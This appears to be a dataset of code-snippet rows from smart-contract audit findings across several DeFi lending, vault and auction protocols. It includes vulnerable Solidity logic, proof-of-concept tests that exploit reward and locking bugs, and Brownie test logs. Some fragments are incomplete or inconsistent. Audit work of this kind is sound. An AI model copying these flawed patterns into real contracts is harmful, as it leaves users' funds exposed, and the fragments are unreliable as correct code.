"```\nfunction _payment(\n    uint256 collateralId,\n    uint8 position,\n    uint256 paymentAmount,\n    address payer\n) internal returns (uint256) {\n    if (paymentAmount == uint256(0)) {\n        return uint256(0);\n    }\n\n    uint256 lienId = liens[collateralId][position];\n    Lien storage lien = lienData[lienId];\n    uint256 end = (lien.start + lien.duration);\n    require(\n        block.timestamp < end || address(msg.sender) == address(AUCTION_HOUSE),\n        ""cannot pay off an expired lien""\n    );\n\n    address lienOwner = ownerOf(lienId);\n    bool isPublicVault = IPublicVault(lienOwner).supportsInterface(\n        type(IPublicVault).interfaceId\n    );\n\n    lien.amount = _getOwed(lien);\n\n    address payee = getPayee(lienId);\n    if (isPublicVault) {\n        IPublicVault(lienOwner).beforePayment(lienId, paymentAmount);\n    }\n    if (lien.amount > paymentAmount) {\n        lien.amount -= paymentAmount;\n        lien.last = block.timestamp.safeCastTo32();\n        if (isPublicVault) {\n            IPublicVault(lienOwner).afterPayment(lienId);\n        }\n    } else {\n        if (isPublicVault &&!AUCTION_HOUSE.auctionExists(collateralId)) {\n            IPublicVault(lienOwner).decreaseEpochLienCount(\n                IPublicVault(lienOwner).getLienEpoch(end)\n            );\n        }\n        //delete liens\n        _deleteLienPosition(collateralId, position);\n        delete lienData[lienId]; //full delete\n        _burn(lienId);\n    }\n\n    TRANSFER_PROXY.tokenTransferFrom(WETH, payer, payee, paymentAmount);\n\n    emit Payment(lienId, paymentAmount);\n    return paymentAmount;\n}"
"```\nif (msg.sender!= holder) {\n    require(msg.sender == operator, ""invalid request"");\n}\n```"
```\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow())\n```\n```\nfunction timeToEpochEnd() public view returns (uint256) {\n    uint256 epochEnd = START() + ((currentEpoch + 1) * EPOCH_LENGTH());\n\n    if (epochEnd >= block.timestamp) {\n        return uint256(0);\n    }\n\n    return block.timestamp - epochEnd;\n}\n```
"```\nTRANSFER_PROXY.tokenTransferFrom(\n    WETH,\n    payer,\n    payee,\n    paymentAmount\n)\n```\nuint256 paymentAmount = totalCapitalAvailable;\n\nfor (uint256 i = 0; i < openLiens.length; ++i) {\n    uint256 capitalSpent = _payment(\n        collateralId,\n        uint8(i),\n        paymentAmount,\n        address(msg.sender)\n    );\n    paymentAmount -= capitalSpent;\n}\n```"
```\nif (block.timestamp >= lien.start + lien.duration) {\n    delta_t = uint256(lien.start + lien.duration - lien.last);\n}\n```
"```\nfunction testVaultFeeIncorrectlySet() public {\n    Dummy721 nft = new Dummy721();\n    address tokenContract = address(nft);\n    uint256 tokenId = uint256(1);\n    address publicVault = _createPublicVault({\n        strategist: strategistOne,\n        delegate: strategistTwo,\n        epochLength: 14 days\n    });\n    uint fee = PublicVault(publicVault).VAULT_FEE();\n    assert(fee == 5000);\n    console.log(fee);\n}\n```"
```\nif (firstBidTime + duration - block.timestamp < timeBuffer):\n```\n```\nuint64 newDuration = uint256(duration + (block.timestamp + timeBuffer - firstBidTime)).safeCastTo64();\n```\n```\nauctions[tokenId].duration = \nauctions[tokenId].maxDuration - firstBidTime;\n```
```\nif (block.number <= lastRepay + overdueBlocks + maxOverdueBlocks) {\n    if (staker!= msg.sender) {\n        revert AuthFailed();\n    }\n}\n```
"```\nit(""PoC: staker with locked balance gets more rewards even when just locked"", async () => {\n    const trustAmount = parseUnits(""2000"");\n    const borrowAmount = parseUnits(""1800"");\n    const [account, staker, borrower] = members;\n\n    const [accountStaked, borrowerStaked, stakerStaked] = await helpers.getStakedAmounts(\n        account,\n        staker,\n        borrower\n    );\n\n    expect(accountStaked).eq(borrowerStaked);\n    expect(borrowerStaked).eq(stakerStaked);\n\n    await helpers.updateTrust(staker, borrower, trustAmount);\n\n    await roll(10);\n    await helpers.borrow(borrower, borrowAmount); // borrows just after withdrawing\n\n    const [accountMultiplier, stakerMultiplier] = await helpers.getRewardsMultipliers(account, staker);\n    console.log(""accountMultiplier: "", accountMultiplier);\n    console.log(""StakerMultiplier: "", stakerMultiplier);\n    expect(accountMultiplier).lt(stakerMultiplier);  // the multiplier is larger even if just locked\n});\n```"
"```\nfunction updateTrust(address borrower, uint96 trustAmount) external onlyMember(msg.sender) whenNotPaused {\n    uint256 voucheesLength = vouchees[staker].length;\n    if (voucheesLength >= maxVouchers) {\n        revert MaxVouchees();\n    }\n\n    uint256 voucherIndex = vouchers[borrower].length;\n    voucherIndexes[borrower][staker] = Index(true, uint128(voucherIndex));\n    vouchers[borrower].push(Vouch(staker, trustAmount, 0, 0));\n```"
"```\nfunction stakeWithPermit(\n    uint256 amount,\n    uint256 nonce,\n    uint256 expiry,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n) external whenNotPaused {\n    IDai erc20Token = IDai(stakingToken);\n    erc20Token.permit(msg.sender, address(this), nonce, expiry, true, v, r, s);\n\n    stake(uint96(amount));\n}\n```\n```\nfunction borrow(address to, uint256 amount) external override onlyMember(msg.sender) whenNotPaused nonReentrant {\n```\n```\nif (!assetManagerContract.withdraw(underlying, to, amount)) {\n    revert WithdrawFailed();\n}\n\nIUserManager(userManager).updateLocked(msg.sender, uint96(amount + fee), true);\n```\n```\nfunction _repayBorrowFresh(\n    address payer,\n    address borrower,\n    uint256 amount\n) internal {\n```\n```\naccountBorrows[borrower].principal = borrowedAmount - repayAmount;\naccountBorrows[borrower].interest = 0;\n```\nIUserManager(userManager).updateLocked(borrower, uint96(repayAmount - interest), false)\n```\nuint256 voucherIndex = vouchers[borrower].length;\nvoucherIndexes[borrower][staker] = Index(true, uint128(voucherIndex));\nvouchers[borrower].push(Vouch(staker, trustAmount, 0, 0));\n\nuint256 voucheeIndex = voucheesLength;\nvouchees[staker].push(Vouchee(borrower, uint96(voucherIndex)));\nvoucheeIndexes[borrower][staker] = Index(true, uint128(voucheeIndex));\n```\n```\nvouch.lastUpdated = uint64(block.number)\n```"
"```\n(bool isMember, uint96 locked, uint96 stakedAmount) = userManager.stakers(user);\n```\nstruct Staker {\n    bool isMember;\n    uint96 stakedAmount;\n    uint96 locked;\n}\n```"
"```\nfor (uint256 i = 0; i < moneyMarketsLength; i++) {\n    IMoneyMarketAdapter moneyMarket = moneyMarkets[i];\n    if (!moneyMarket.supportsToken(tokenAddress)) continue;\n    moneyMarket.withdrawAll(tokenAddress, address(this));\n\n    supportedMoneyMarkets[supportedMoneyMarketsSize] = moneyMarket;\n    supportedMoneyMarketsSize++;\n}\n```\n```\nfunction validateWithdraw(\n    DataTypes.ReserveCache memory reserveCache,\n    uint256 amount,\n    uint256 userBalance\n) internal pure {\n    require(amount!= 0, Errors.INVALID_AMOUNT);\n```"
"```\nIUserManager(userManager).updateLocked(msg.sender, uint96(amount + fee), true);\n...\nIUserManager(userManager).updateLocked(borrower, uint96(repayAmount - interest), false);\n```\n```\nfunction updateLocked(\n    address borrower,\n    uint96 amount,\n    bool lock\n) external onlyMarket {\n    uint96 remaining = amount;\n\n    for (uint256 i = 0; i < vouchers[borrower].length; i++) {\n```\n```\nfunction registerMember(address newMember) public virtual whenNotPaused {\n    if (stakers[newMember].isMember) revert NoExistingMember();\n\n    uint256 count = 0;\n    uint256 vouchersLength = vouchers[newMember].length;\n\n    for (uint256 i = 0; i < vouchersLength; i++) {\n```"
"```\nfunction _validateRuntimeConfig(RuntimeConfig calldata config) internal view {\n    // Can't set royalties to more than 100%\n    require(config.royaltiesBps <= ROYALTIES_BASIS, ""Royalties too high"");\n\n    // rest of code\n}"
"```\nfunction hasRole(bytes32 role, address account)\n    public\n    view\n    virtual\n    override\n    returns (bool)\n{\n    return super.hasRole(ADMIN_ROLE, account) ||\n           super.hasRole(role, account);\n}\n```"
"```\nfunction _setTemplate(\n    string memory templateName,\n    uint256 templateVersion,\n    address implementationAddress\n) internal {\n    if (latestImplementation[templateName] == address(0)) {\n        _templateNames.push(templateName);\n    }\n\n    if (templateVersion > latestVersion[templateName]) {\n        latestVersion[templateName] = templateVersion;\n        if (templateVersion!= 0) {\n            latestImplementation[templateName] = implementationAddress;\n        }\n    }\n}\n```"
"```\nsignedOnly(\n    abi.encodePacked(\n        msg.sender,\n        instance,\n        data\n    ),\n    signature\n)"
"```\nit(""previewWithdraw reverts if buyer has too many contracts"", async () => {\n  assert.isEmpty(await auction.getEpochsByBuyer(addresses.buyer1));\n\n  await asset.connect(signers.buyer1).approve(addresses.auction, ethers.constants.MaxUint256);\n\n  const totalContracts = await auction.getTotalContracts(epoch);\n  await auction.addLimitOrder(\n    epoch,\n    fixedFromFloat(params.price.max),\n    totalContracts.mul(2)\n  );\n\n  await auction.addLimitOrder(\n    epoch,\n    fixedFromFloat(params.price.max),\n    totalContracts.div(2)\n  );\n\n  const epochByBuyer = await auction.getEpochsByBuyer(addresses.buyer1);\n\n  assert.equal(epochByBuyer.length, 1);\n  assert.bnEqual(epochByBuyer[0], epoch);\n\n  await expect(auction.callStatic[""previewWithdraw(uint64)""](epoch)).to.be.reverted;\n});"
"```\nuint256 adjustedTotalAssets = _totalAssets() + l.totalWithdrawals;\n\nif (adjustedTotalAssets > l.lastTotalAssets) {\n    netIncome = adjustedTotalAssets - l.lastTotalAssets;\n\n    feeInCollateral = l.performanceFee64x64.mul(l.netIncome);\n\n    ERC20.safeTransfer(l.feeRecipient, feeInCollateral);\n}\n```"
"```\nbool cancelled = l.Auction.isCancelled(lastEpoch);\nbool finalized = l.Auction.isFinalized(lastEpoch);\n\nrequire(\n    (!finalized && cancelled) || (finalized &&!cancelled),\n    ""auction is not finalized nor cancelled""\n);"
"```\nfunction _executeTrade(\n    address target,\n    uint256 msgValue,\n    bytes memory params,\n    address spender,\n    Trade memory trade\n) private {\n    uint256 preTradeBalance;\n\n    if (trade.sellToken == address(Deployments.WETH) && spender == Deployments.ETH_ADDRESS) {\n        preTradeBalance = address(this).balance;\n        uint256 withdrawAmount = _isExactIn(trade)? trade.amount : trade.limit;\n        Deployments.WETH.withdraw(withdrawAmount);\n    } else if (trade.sellToken == Deployments.ETH_ADDRESS && spender!= Deployments.ETH_ADDRESS) {\n        preTradeBalance = IERC20(address(Deployments.WETH)).balanceOf(address(this));\n        uint256 depositAmount = _isExactIn(trade)? trade.amount : trade.limit;\n        Deployments.WETH.deposit{value: depositAmount}();\n    }\n\n    (bool success, bytes memory returnData) = target.call{value: msgValue}(params);\n    if (!success) revert TradeExecution(returnData);\n\n    if (trade.buyToken == address(Deployments.WETH)) {\n        if (address(this).balance > preTradeBalance) {\n            uint256 depositAmount;\n            unchecked {\n                depositAmount = address(this).balance - preTradeBalance;\n            }\n            Deployments.WETH.deposit{value: depositAmount}();\n        }\n    } else if (trade.buyToken == Deployments.ETH_ADDRESS) {\n        uint256 postTradeBalance = IERC20(address(Deployments.WETH)).balanceOf(address(this));\n        if (postTradeBalance > preTradeBalance) {\n            uint256 withdrawAmount;\n            unchecked {\n                withdrawAmount = postTradeBalance - preTradeBalance;\n            }\n            Deployments.WETH.withdraw(withdrawAmount);\n        }\n    }\n}\n```"
"```\nfunction getExecutionData(address from, Trade calldata trade)\n    {\n        executionCallData = abi.encodeWithSelector(\n            IUniV2Router2.swapExactTokensForTokens.selector,\n            trade.amount,\n            trade.limit,\n            data.path,\n            from,\n            trade.deadline\n        );\n    }\n```\n```\nlibrary ZeroExAdapter {\n    function getExecutionData(address from, Trade calldata trade)\n        internal view returns (\n            address spender,\n            address target,\n            uint256,\n            bytes memory executionCallData\n        ) {\n        spender = Deployments.ZERO_EX;\n        target = Deployments.ZERO_EX;\n        executionCallData = trade.exchangeData;\n    }\n}\n```\nfunction sellToLiquidityProvider(\n    IERC20TokenV06 inputToken,\n    IERC20TokenV06 outputToken,\n    ILiquidityProvider provider,\n    address recipient,\n    uint256 sellAmount,\n    uint256 minBuyAmount,\n    bytes calldata auxiliaryData\n) {\n    /// @dev Sells `sellAmount` of `inputToken` to the liquidity provider\n    ///      at the given `provider` address.\n    /// @param inputToken The token being sold.\n    /// @param outputToken The token being bought.\n    /// @param provider The address of the on-chain liquidity provider\n    ///        to trade with.\n    /// @param recipient The recipient of the bought tokens. If equal to\n    ///        address(0), `msg.sender` is assumed to be the recipient.\n    /// @param sellAmount The amount of `inputToken` to sell.\n    /// @param minBuyAmount The minimum acceptable amount of `outputToken` to\n    ///        buy. Reverts if this amount is not satisfied.\n    /// @param auxiliaryData Auxiliary data supplied to the `provider` contract.\n    /// @return boughtAmount The amount of `outputToken` bought.\n}\n```\n```\nfunction sellTokenForTokenToUniswapV3(\n    bytes memory encodedPath,\n    uint256 sellAmount,\n    uint256 minBuyAmount,\n    address recipient\n) \n    /// @dev Sell a token for another token directly against uniswap v3.\n    /// @param encodedPath Uniswap-encoded path.\n    /// @param sellAmount amount of the first token in the path to sell.\n    /// @param minBuyAmount Minimum amount of the last token in the path to buy.\n    /// @param recipient The recipient of the bought tokens. Can be zero for sender.\n    /// @return buyAmount Amount of the last token in the path bought.\n    returns (uint256 buyAmount)\n```"
"```\nparams.minPrimary = poolContext._getTimeWeightedPrimaryBalance(\n    oracleContext, strategyContext, bptToSettle\n)\n\nparams.minPrimary = params.minPrimary * strategyContext.vaultSettings.balancerPoolSlippageLimitPercent / uint256(BalancerConstants.VAULT_PERCENT_BASIS)\n```"
"```\nbptClaim = (strategyTokenAmount * context.totalBPTHeld) / context.vaultState.totalStrategyTokenGlobal;\n```\n```\nfunction _convertBPTClaimToStrategyTokens(\n    StrategyContext memory context,\n    uint256 bptClaim\n) internal pure returns (uint256 strategyTokenAmount) {\n    if (context.totalBPTHeld == 0) {\n        return (bptClaim * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / \n            BalancerConstants.BALANCER_PRECISION;\n    }\n\n    strategyTokenAmount = (bptClaim * context.vaultState.totalStrategyTokenGlobal) / context.totalBPTHeld;\n}\n```\nfunction _convertStrategyTokensToBPTClaim(\n    StrategyContext memory context,\n    uint256 strategyTokenAmount\n) internal pure returns (uint256 bptClaim) {\n    require(strategyTokenAmount <= context.vaultState.totalStrategyTokenGlobal);\n    if (context.vaultState.totalStrategyTokenGlobal > 0) {\n        bptClaim = (strategyTokenAmount * context.totalBPTHeld) / context.vaultState.totalStrategyTokenGlobal;\n    }\n}\n```"
"```\nfunction claimRewardTokens() external returns (uint256[] memory claimedBalances) {\n    uint16 feePercentage = BalancerVaultStorage.getStrategyVaultSettings().feePercentage;\n    IERC20[] memory rewardTokens = _rewardTokens();\n\n    uint256 numRewardTokens = rewardTokens.length;\n\n    claimedBalances = new uint256[](numRewardTokens);\n\n    for (uint256 i = 0; i < numRewardTokens; i++) {\n        claimedBalances[i] = rewardTokens[i].balanceOf(address(this));\n    }\n\n    AURA_REWARD_POOL.getReward(address(this), true);\n\n    for (uint256 i = 0; i < numRewardTokens; i++) {\n        claimedBalances[i] = rewardTokens[i].balanceOf(address(this)) - claimedBalances[i];\n\n        if (claimedBalances[i] > 0 && feePercentage!= 0 && FEE_RECEIVER!= address(0)) {\n            uint256 feeAmount = claimedBalances[i] * feePercentage / BalancerConstants.VAULT_PERCENT_BASIS;\n            rewardTokens[i].transfer(FEE_RECEIVER, feeAmount);\n            claimedBalances[i] -= feeAmount;\n        }\n    }\n\n    emit BalancerEvents.ClaimedRewardTokens(rewardTokens, claimedBalances);\n}\n```\n```\nfunction getReward(address _account, bool _claimExtras) public returns(bool) {\n    uint256 reward = earned(_account);\n    if (reward > 0) {\n        rewards[_account] = 0;\n        rewardToken.safeTransfer(_account, reward);\n        IDeposit(operator).rewardClaimed(pid, _account, reward);\n        emit RewardPaid(_account, reward);\n    }\n\n    if (_claimExtras) {\n        for (uint i = 0; i < extraRewards.length; i++) {\n            IRewards(extraRewards[i]).getReward(_account);\n        }\n    }\n    return true;\n}\n\nmodifier updateReward(address account) {\n    rewardPerTokenStored = rewardPerToken();\n    lastUpdateTime = lastTimeRewardApplicable();\n    if (account!= address(0)) {\n        rewards[account] = earned(account);\n        userRewardPerTokenPaid[account] = rewardPerTokenStored;\n    }\n    _;\n}\n\nfunction earned(address account) public view returns (uint256) {\n    return balanceOf(account).mul(rewardPerToken().sub(userRewardPerTokenPaid[account])).div(1e18).add(rewards[account]);\n}\n```\n```\nimport pytest\nfrom brownie import ZERO_ADDRESS, Wei, accounts, interface\nfrom tests.fixtures import *\nfrom tests.balancer.helpers import enterMaturity, get_metastable_amounts\nfrom scripts.common import get_univ3_single_data, get_univ3_batch_data, DEX_ID, TRADE_TYPE\n\nchain = Chain()\n\ndef test_claim_rewards_success(StratStableETHstETH):\n    env, vault = StratStableETHstETH\n    primaryBorrowAmount = 100e8\n    depositAmount = 50e18\n    enterMaturity(env, vault, 1, 0, depositAmount, primaryBorrowAmount, accounts[0])\n    chain.sleep(3600 * 24 * 365)\n    chain.mine()\n    feeReceiver = vault.getStrategyContext()[""baseStrategy""][""feeReceiver""]\n    feePercentage = vault.getStrategyContext()[""baseStrategy""][""vaultSettings""][""feePercentage""] / 1e2\n    assert env.tokens[""BAL""].balanceOf(vault.address) == 0\n    assert env.tokens[""AURA""].balanceOf(vault.address) == 0\n    assert env.tokens[""BAL""].balanceOf(feeReceiver) == 0\n    assert env.tokens[""AURA""].balanceOf(feeReceiver) == 0\n\n    vault.claimRewardTokens({""from"": accounts[1]})\n\n    assert env.tokens[""BAL""].balanceOf(feeReceiver) > 0\n    assert env.tokens[""AURA""].balanceOf(feeReceiver) > 0\n\ndef test_claim_rewards_success_frontrun(StratStableETHstETH):\n    env, vault = StratStableETHstETH\n    primaryBorrowAmount = 100e8\n    depositAmount = 50e18\n    enterMaturity(env, vault, 1, 0, depositAmount, primaryBorrowAmount, accounts[0])\n    chain.sleep(3600 * 24 * 365)\n    chain.mine()\n    feeReceiver = vault.getStrategyContext()[""baseStrategy""][""feeReceiver""]\n    feePercentage = vault.getStrategyContext()[""baseStrategy""][""vaultSettings""][""feePercentage""] / 1e2\n    assert env.tokens[""BAL""].balanceOf(vault.address) == 0\n    assert env.tokens[""AURA""].balanceOf(vault.address) == 0\n    assert env.tokens[""BAL""].balanceOf(feeReceiver) == 0\n    assert env.tokens[""AURA""].balanceOf(fee\n```\nbrownie test tests/balancer/rewards/test_rewards_stable_eth_steth.py --network mainnet-fork\n\nBrownie v1.18.1 - Python development framework for Ethereum\n\n=============================================================================================== test session starts ===============================================================================================\n\nplatform linux -- Python 3.8.10, pytest-6.2.5, py-1.11.0, pluggy-1.0.0\nplugins: eth-brownie-1.18.1, hypothesis-6.27.3, forked-1.4.0, xdist-1.34.0, web3-5.27.0\n\ncollected 2 items\n\ntests/balancer/rewards/test_rewards_stable_eth_steth.py..\nAttached to local RPC client listening at '127.0.0.1:8545'\n\n========================================================================================== 2 passed, 1 warning in 5.72s ==========================================================================================="
"```\nfunction reinvestReward(\n    MetaStable2TokenAuraStrategyContext calldata context,\n    ReinvestRewardParams calldata params\n) external {\n```\n```\nfunction reinvestReward(\n    Boosted3TokenAuraStrategyContext calldata context,\n    ReinvestRewardParams calldata params\n) external {\n```"
"```\n""postMaturitySettlementSlippageLimitPercent"": 10e6,  # 10%\n""emergencySettlementSlippageLimitPercent"": 10e6,  # 10%\n```\n```\nfunction settleVaultEmergency(\n    MetaStable2TokenAuraStrategyContext calldata context,\n    uint256 maturity,\n    bytes calldata data\n) external {\n    RedeemParams memory params = SettlementUtils._decodeParamsAndValidate(\n        context.baseStrategy.vaultSettings.emergencySettlementSlippageLimitPercent,\n        data\n    );\n\n    uint256 bptToSettle = context.baseStrategy._getEmergencySettlementParams({\n        poolContext: context.poolContext.basePool,\n        maturity: maturity,\n        totalBPTSupply: IERC20(context.poolContext.basePool.pool).totalSupply()\n    });\n```\n```\nfunction _decodeParamsAndValidate(\n    uint32 slippageLimitPercent,\n    bytes memory data\n) internal view returns (RedeemParams memory params) {\n    params = abi.decode(data, (RedeemParams));\n    DynamicTradeParams memory callbackData = abi.decode(\n        params.secondaryTradeParams, (DynamicTradeParams)\n    );\n\n    if (callbackData.oracleSlippagePercent > slippageLimitPercent) {\n        revert Errors.SlippageTooHigh(callbackData.oracleSlippagePercent, slippageLimitPercent);\n    }\n}\n```\n```\nfunction executeTradeWithDynamicSlippage(\n    uint16 dexId,\n    Trade memory trade,\n    uint32 dynamicSlippageLimit\n) external override returns (uint256 amountSold, uint256 amountBought) {\n    trade.limit = PROXY.getLimitAmount(\n        trade.tradeType,\n        trade.sellToken,\n        trade.buyToken,\n        trade.amount,\n        dynamicSlippageLimit\n    );\n}\n```\n```\nfunction _getLimitAmount(\n    TradeType tradeType,\n    address sellToken,\n    address buyToken,\n    uint256 amount,\n    uint32 slippageLimit,\n    uint256 oraclePrice,\n    uint256 oracleDecimals\n) internal view returns (uint256 limitAmount) {\n    uint256 sellTokenDecimals = 10 ** (\n        sellToken == Deployments.ETH_ADDRESS\n           ? 18\n            : IERC20(sellToken).decimals()\n    );\n    uint256 buyTokenDecimals = 10 ** (\n        buyToken == Deployments.ETH_ADDRESS\n           ? 18\n            : IERC20(buyToken).decimals()\n    );\n\n    if (tradeType == TradeType.EXACT_OUT_SINGLE || tradeType == TradeType.EXACT_OUT_BATCH) {\n        if (slippageLimit == 0) {\n            return type(uint256).max;\n        }\n        oraclePrice = (oracleDecimals * oracleDecimals) / oraclePrice;\n        limitAmount = ((oraclePrice +\n            ((oraclePrice * uint256(slippageLimit)) / Constants.SLIPPAGE_LIMIT_PRECISION)) * amount) /\n            oracleDecimals;\n        limitAmount = (limitAmount * sellTokenDecimals) / buyTokenDecimals;\n    } else {\n        if (slippageLimit == 0) {\n            return 0;\n        }\n        limitAmount = ((oraclePrice -\n            ((oraclePrice * uint256(slippageLimit)) / Constants.SLIPPAGE_LIMIT_PRECISION)) * amount) /\n            oracleDecimals;\n        limitAmount = (limitAmount * buyTokenDecimals) / sellTokenDecimals;\n    }\n}\n```\ndef test_emergency_single_maturity_success(StratBoostedPoolUSDCPrimary):\n    env, vault = StratBoostedPoolUSDCPrimary\n    primaryBorrowAmount = 5000e8\n    depositAmount = 10000e6\n    env.tokens[""USDC""].approve(env.notional, 2 ** 256 - 1, {""from"": env.whales[""USDC""]})\n\n    maturity = enterMaturity(env, vault, 2, 0, depositAmount, primaryBorrowAmount, env.whales[""USDC""])\n\n    strategyContext = vault.getStrategyContext()\n    settings = dict(strategyContext[""baseStrategy""][""vaultSettings""].dict())\n    settings[""maxBalancerPoolShare""] = 0\n\n    vault.setStrategyVaultSettings(list(settings.values()), {""from"": env.notional.owner()})\n\n    redeemParams = get_redeem_params(0, 0, \n        get_dynamic_trade_params(\n            DEX_ID[""UNISWAP_V3""], TRADE_TYPE[""EXACT_IN_SINGLE""], 11e6, True, \n            get_univ3_single_data(3000)\n        )\n    )\n\n    vault.settleVaultEmergency(maturity, redeemParams, {""from"": env.notional.owner()})\n\n    vaultState = env.notional.getVaultState(vault.address, maturity)\n    assert vaultState[""totalStrategyTokens""] == 0\n```\n```\nbrownie test tests/balancer/settlement/test_settlement_boosted_usdc.py --network mainnet-fork\n\nBrownie v1.18.1 - Python development framework for Ethereum\n\n=============================================================================================== test session starts ===============================================================================================\n\nplatform linux -- Python 3.8.10, pytest-6.2.5, py-1.11.0, pluggy-1.0.0\nplugins: eth-brownie-1.18.1, hypothesis-6.27.3, forked-1.4.0, xdist-1.34.0, web3-5.27.0\ncollected 1 item\n\ntests/balancer/settlement/test_settlement_boosted_usdc.py\nF\n==================================================================================================== FAILURES =====================================================================================================\n```\n```\ndef test_emergency_single_maturity_success(StratBoostedPoolUSDCPrimary):\n    env, vault = StratBoostedPoolUSDCPrimary\n    primaryBorrowAmount = 5000e8\n    depositAmount = 10000e6\n    env.tokens[""USDC""].approve(env.notional, 2 ** 256 - 1, {""from"": env.whales[""USDC""]})\n\n    maturity = enterMaturity(env, vault, 2, 0, depositAmount, primaryBorrowAmount, env.whales[""USDC""])\n\n    strategyContext = vault.getStrategyContext()\n    settings = dict(strategyContext[""baseStrategy""][""vaultSettings""].dict())\n    settings[""maxBalancerPoolShare""] = 0\n\n    vault.setStrategyVaultSettings(list(settings.values()), {""from"": env.notional.owner()})\n\n    redeemParams = get_redeem_params(0, 0, \n        get_dynamic_trade_params(\n            DEX_ID[""UNISWAP_V3""], \n            TRADE_TYPE[""EXACT_IN_SINGLE""], \n            0, \n            True, \n            get_univ3_single_data(3000)\n        )\n    )\n\n    vault.settleVaultEmergency(maturity, redeemParams, {""from"": env.notional.owner()})\n\n    vaultState = env.notional.getVaultState(vault.address, maturity)\n    assert vaultState[""totalStrategyTokens""] == 0\n```\n```\nbrownie test tests/balancer/settlement/test_settlement_boosted_usdc.py --network mainnet-fork\n\nBrownie v1.18.1 - Python development framework for Ethereum\n\n=============================================================================================== test session starts ===============================================================================================\n\nplatform linux -- Python 3.8.10, pytest-6.2.5, py-1.11.0, pluggy-1.0.0\nplugins: eth-brownie-1.18.1, hypothesis-6.27.3, forked-1.4.0, xdist-1.34.0, web3-5.27.0\n\ncollected 1 item\n\ntests/balancer/settlement/test_settlement_boosted_usdc.py.\n\n========================================================================================== 1 passed, 1 warning in 4.31s ==========================================================================================="
"```\nfunction _getOraclePairPrice(\n    TwoTokenPoolContext memory poolContext,\n    OracleContext memory oracleContext,\n    ITradingModule tradingModule\n) internal view returns (uint256 oraclePairPrice) {\n    uint256 balancerWeightedPrice;\n    if (oracleContext.balancerOracleWeight > 0) {\n        uint256 balancerPrice = BalancerUtils._getTimeWeightedOraclePrice(\n            address(poolContext.basePool.pool),\n            IPriceOracle.Variable.PAIR_PRICE,\n            oracleContext.oracleWindowInSeconds\n        );\n\n        if (poolContext.primaryIndex == 1) {\n            // If the primary index is the second token, we need to invert\n            // the balancer price.\n            balancerPrice = BalancerConstants.BALANCER_PRECISION_SQUARED / balancerPrice;\n        }\n\n        balancerWeightedPrice = balancerPrice * oracleContext.balancerOracleWeight;\n    }\n\n    uint256 chainlinkWeightedPrice;\n    if (oracleContext.balancerOracleWeight < BalancerConstants.BALANCER_ORACLE_WEIGHT_PRECISION) {\n        (int256 rate, int256 decimals) = tradingModule.getOraclePrice(\n            poolContext.primaryToken, poolContext.secondaryToken\n        );\n        require(rate > 0);\n        require(decimals >= 0);\n\n        if (uint256(decimals)!= BalancerConstants.BALANCER_PRECISION) {\n            rate = (rate * int256(BalancerConstants.BALANCER_PRECISION)) / decimals;\n        }\n\n        // No overflow in rate conversion, checked above\n        chainlinkWeightedPrice = uint256(rate) * \n            (BalancerConstants.BALANCER_ORACLE_WEIGHT_PRECISION - oracleContext.balancerOracleWeight);\n    }\n\n    oraclePairPrice = (balancerWeightedPrice + chainlinkWeightedPrice) / \n        BalancerConstants.BALANCER_ORACLE_WEIGHT_PRECISION;\n}\n```\nfunction _getTimeWeightedOraclePrice(\n    address pool,\n    IPriceOracle.Variable variable,\n    uint256 secs\n) internal view returns (uint256) {\n    IPriceOracle.OracleAverageQuery[] memory queries = new IPriceOracle.OracleAverageQuery[](1);\n\n    queries[0].variable = variable;\n    queries[0].secs = secs;\n    queries[0].ago = 0; // now\n\n    return IPriceOracle(pool).getTimeWeightedAverage(queries)[0];\n}\n```"
"```\nFile: BalancerEnvironment.py\n\n""oracleWindowInSeconds"": 3600,\n""maxBalancerPoolShare"": 2e3,  # 20%\n""settlementSlippageLimitPercent"": 5e6,  # 5%\n```\n```\nfunction _bptThreshold(\n    StrategyVaultSettings memory strategyVaultSettings,\n    uint256 totalBPTSupply\n) internal pure returns (uint256) {\n    return (totalBPTSupply * strategyVaultSettings.maxBalancerPoolShare) / BalancerConstants.VAULT_PERCENT_BASIS;\n}\n```\n```\nfunction _joinPoolAndStake(\n    TwoTokenPoolContext memory poolContext,\n    StrategyContext memory strategyContext,\n    AuraStakingContext memory stakingContext,\n    uint256 primaryAmount,\n    uint256 secondaryAmount,\n    uint256 minBPT\n) internal returns (uint256 bptMinted) {\n    PoolParams memory poolParams = poolContext._getPoolParams(\n        primaryAmount,\n        secondaryAmount,\n        true // isJoin\n    );\n\n    bptMinted = BalancerUtils._joinPoolExactTokensIn({\n        context: poolContext.basePool,\n        params: poolParams,\n        minBPT: minBPT\n    });\n\n    uint256 bptThreshold = strategyContext.vaultSettings._bptThreshold(\n        poolContext.basePool.pool.totalSupply()\n    );\n    uint256 bptHeldAfterJoin = strategyContext.totalBPTHeld + bptMinted;\n    if (bptHeldAfterJoin > bptThreshold)\n        revert Errors.BalancerPoolShareTooHigh(bptHeldAfterJoin, bptThreshold);\n\n    stakingContext.auraBooster.deposit(stakingContext.auraPoolId, bptMinted, true); // stake = true\n}\n```\n```\nfunction enterMaturity(\n    VaultState memory vaultState,\n    VaultAccount memory vaultAccount,\n    VaultConfig memory vaultConfig,\n    uint256 strategyTokenDeposit,\n    uint256 additionalUnderlyingExternal,\n    bytes calldata vaultData\n) internal returns (uint256 strategyTokensAdded) {\n    require(vaultState.totalAssetCash == 0);\n```"
